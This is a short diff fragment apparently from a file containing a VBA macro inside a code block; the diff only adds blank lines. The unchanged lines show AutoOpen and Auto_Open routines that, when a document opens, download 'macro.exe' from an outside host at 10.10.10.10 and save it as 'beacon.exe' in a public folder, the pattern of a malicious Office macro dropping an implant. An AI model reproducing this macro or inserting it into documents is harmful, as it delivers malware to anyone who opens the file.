@@ -32,7 +32,10 @@ Sub AutoOpen()
     DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
 End Sub
 
+
 Sub Auto_Open()
     DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
 End Sub
 ```
+
+
